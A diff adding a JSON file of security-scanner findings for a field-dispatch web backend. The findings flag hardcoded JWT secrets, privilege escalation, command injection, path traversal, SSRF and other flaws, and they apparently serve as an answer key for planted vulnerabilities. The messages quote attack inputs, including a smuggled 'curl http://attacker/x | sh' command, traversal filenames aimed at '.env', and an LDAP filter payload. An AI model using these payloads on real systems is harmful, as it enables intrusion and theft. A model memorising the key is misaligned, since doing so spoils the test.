@@ -1,0 +1,388 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.credentials.hardcoded-jwt-secret",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 33,
+        "col": 1,
+        "offset": 1221
+      },
+      "end": {
+        "line": 33,
+        "col": 100,
+        "offset": 1321
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to a well-known hardcoded value 'field-dispatch-dev-jwt-secret-change-in-production' when process.env.JWT_SECRET is unset. An attacker who knows this value can forge a JWT for any user id and role (e.g. {id: <uuid>, role: 'ops_admin'}), completely bypassing authentication and authorization. The secret is also embedded in the source, so even the fallback is never safe.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.role-registration-escalation",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 104,
+        "col": 1,
+        "offset": 3829
+      },
+      "end": {
+        "line": 115,
+        "col": 1,
+        "offset": 4400
+      },
+      "extra": {
+        "message": "The public, unauthenticated POST /api/auth/register endpoint reads an arbitrary 'role' from the request body and inserts it verbatim ('role: role || 'customer'' at line 112) with no allowlist, then signs a JWT from that role (line 115). Any anonymous attacker can register with role='ops_admin' (or 'dispatcher') and obtain a fully privileged account, i.e. privilege escalation via self-registration.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-284: Improper Access Control",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1804,
+        "col": 1,
+        "offset": 86031
+      },
+      "end": {
+        "line": 1810,
+        "col": 1,
+        "offset": 86260
+      },
+      "extra": {
+        "message": "In GET /api/regions/:id/archive-export, the user-controlled query parameter 'outputType' is interpolated directly into a shell command string ('--${format}') which is then executed with spawn(cmd, [], { shell: true }). A value such as 'gzip; curl http://attacker/x | sh' or 'x --check=/tmp' yields arbitrary OS command execution as the server process. Note the sibling endpoint coverage-export safely uses spawn without shell and a preset allowlist, confirming the unsafe pattern here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1100,
+        "col": 1,
+        "offset": 48844
+      },
+      "end": {
+        "line": 1101,
+        "col": 1,
+        "offset": 48940
+      },
+      "extra": {
+        "message": "POST /api/incidents/:id/attachments writes the uploaded file to resolve(archiveDir, data.filename) using the attacker-supplied multipart filename. Unlike the sibling worker-certifications handler (which calls path.basename), no basename/sanitization is applied, so a filename like '../../backend/src/app.ts', '../.env' or an absolute path lets a dispatcher/ops user write arbitrary files anywhere on the filesystem (path traversal arbitrary file write).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1850,
+        "col": 1,
+        "offset": 88481
+      },
+      "end": {
+        "line": 1852,
+        "col": 1,
+        "offset": 88580
+      },
+      "extra": {
+        "message": "POST /api/admin/service-types/:id/icon-upload streams the uploaded file to resolve(iconDir, data.filename) where data.filename is fully user-controlled and never sanitized with path.basename. A filename containing '../' (e.g. '../../x.html') or an absolute path escapes the service-icons directory and writes arbitrary files. Compare with the region badge-upload handler which correctly generates a crypto.randomUUID()-based name.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-read",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1691,
+        "col": 1,
+        "offset": 80741
+      },
+      "end": {
+        "line": 1695,
+        "col": 1,
+        "offset": 80860
+      },
+      "extra": {
+        "message": "GET /api/admin/service-types/template joins the user-controlled query parameter 'templateName' with path.join(TEMPLATE_DIR, templateName) and readFileSync's the result. path.join does NOT keep the result inside TEMPLATE_DIR, so templateName='../../src/app.ts' or '../../../.env' reads any file readable by the process and returns its contents. The sibling customer-reports route performs a resolve()+prefix check; this route does not.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1490,
+        "col": 1,
+        "offset": 70140
+      },
+      "end": {
+        "line": 1491,
+        "col": 1,
+        "offset": 70220
+      },
+      "extra": {
+        "message": "GET /api/workers/directory-search builds an LDAP filter by concatenating the raw user-controlled 'uid' query parameter: `(uid=${uid})`. No LDAP metacharacter escaping is applied, so an attacker can inject filter logic (e.g. uid=*)(objectClass=*)). An escapeDirectoryFilter() helper exists but is only used by the sibling directory-lookup route, showing the intended control was omitted here, enabling LDAP filter injection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.webhook-test-delivery",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1896,
+        "col": 1,
+        "offset": 90871
+      },
+      "end": {
+        "line": 1901,
+        "col": 1,
+        "offset": 91040
+      },
+      "extra": {
+        "message": "POST /api/webhooks/:id/test-delivery takes an arbitrary URL from the 'x-webhook-callback' request header (falling back to the stored webhook URL) and the server fetches it with no host/scheme allowlist or redirect protection. This is a classic SSRF: the value can point at loopback (http://127.0.0.1:...), cloud metadata (169.254.169.254), or internal services. The sibling document-source-verify route enforces an ALLOWED_HOSTS allowlist, confirming the control is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.idor-job-rate-detail",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1181,
+        "col": 1,
+        "offset": 52994
+      },
+      "end": {
+        "line": 1183,
+        "col": 1,
+        "offset": 53120
+      },
+      "extra": {
+        "message": "GET /api/jobs/:id/rate-detail returns the complete job row including sensitive 'internalNotes' to ANY authenticated user when the query string dataLevel=full. Unlike GET /api/jobs/:id (which enforces customer-ownership, worker-assignment, and dispatcher-region checks at lines 367-377), this route performs no authorization on the target job, so any customer or field worker can enumerate job UUIDs and read internal notes/priority/pricing data belonging to other customers (IDOR / missing authorization).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.customer-account-settings",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1214,
+        "col": 1,
+        "offset": 54779
+      },
+      "end": {
+        "line": 1215,
+        "col": 1,
+        "offset": 54920
+      },
+      "extra": {
+        "message": "PATCH /api/customers/:id/account-settings is protected only by app.authenticate and never verifies that the caller owns the customer (no userId check, no role restriction), so any authenticated user can update ANY customer record. Furthermore Object.assign(customer, request.body) then writes back the whole merged object, so arbitrary columns (userId, isActive, email, companyName, notes, phone) are mass-assignable - enabling cross-tenant data tampering and letting an attacker repoint a victim customer's userId to their own account.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.http-header-injection",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1413,
+        "col": 1,
+        "offset": 65834
+      },
+      "end": {
+        "line": 1421,
+        "col": 1,
+        "offset": 66400
+      },
+      "extra": {
+        "message": "GET /api/jobs/:id/certificate takes the user-controlled 'export_name' query parameter and interpolates it unvalidated into the Content-Disposition response header value at line 1421 (`attachment; filename=\"${label}.txt\"`). CR/LF or other control characters in export_name enable HTTP response header injection / response splitting. Note the sibling rate-sheet route explicitly strips CR/LF with .replace(/[\\r\\n]/g,'') (line 1431), confirming the sanitization that is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')",
+            "CWE-644: Improper Neutralization of HTTP Headers"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.dispatcher-region-scope",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 419,
+        "col": 1,
+        "offset": 18782
+      },
+      "end": {
+        "line": 423,
+        "col": 1,
+        "offset": 18960
+      },
+      "extra": {
+        "message": "Mutating job endpoints (PUT /api/jobs/:id at lines 418-428, POST /api/jobs at 404-416, POST /api/jobs/:id/status at 430-471, PUT /api/route-stops/reorder at 511) require only the 'dispatcher' role and never verify that the target job/route/customer belongs to one of the dispatcher's assigned regions (dispatcherRegions). The GET /api/jobs list (lines 312-316) and GET /api/jobs/:id (lines 372-377) DO enforce region scoping, so a dispatcher can create/edit/transition jobs or reorder routes outside their permitted regions, contradicting the documented 'dispatchers are scoped to their permitted regions' rule.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.csv-formula-injection",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 503,
+        "col": 1,
+        "offset": 22727
+      },
+      "end": {
+        "line": 503,
+        "col": 1,
+        "offset": 22860
+      },
+      "extra": {
+        "message": "GET /api/jobs/export/completion-report builds CSV rows by raw string concatenation of DB fields (title, companyName) with no quoting, escaping, or formula neutralization (unlike the job CSV export at lines 481-486 which has an escCsv helper). A companyName or title beginning with '=', '+', '-', '@' yields spreadsheet formula/CSV injection when the report is opened in Excel, and embedded commas/quotes corrupt the CSV structure.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-bcrypt-cost",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1941,
+        "col": 1,
+        "offset": 93081
+      },
+      "end": {
+        "line": 1941,
+        "col": 1,
+        "offset": 93160
+      },
+      "extra": {
+        "message": "POST /api/workers/onboard-account hashes the new worker's password with a bcrypt cost factor taken directly from the request body and defaulting to only 4 rounds (bcrypt.hash(password, costFactor || 4)). 2^4 rounds is trivially brute-forceable, producing weak password hashes for onboarded worker accounts, and an attacker-controlled huge costFactor value can also stall the event loop (bcryptjs is synchronous). The sibling dispatcher on-board endpoint correctly fixes the cost at 12.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.quick-access-cookie",
+      "path": "backend/src/app.ts",
+      "start": {
+        "line": 1324,
+        "col": 1,
+        "offset": 61084
+      },
+      "end": {
+        "line": 1324,
+        "col": 1,
+        "offset": 61160
+      },
+      "extra": {
+        "message": "issuePortalQuickAccess (and support-context) set the 'portalQuickAccess' cookie - which acts as an unauthenticated bearer capability for the anonymous GET /api/customers/portal-quick-access/context endpoint that returns customer data and jobs - without HttpOnly, Secure, or SameSite attributes and with no expiration/TTL on the underlying session Map entry. The token is readable by client-side JS (XSS-stealable), transmittable over plain HTTP, and never expires, giving persistent unauthenticated access to a customer's job data if leaked.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
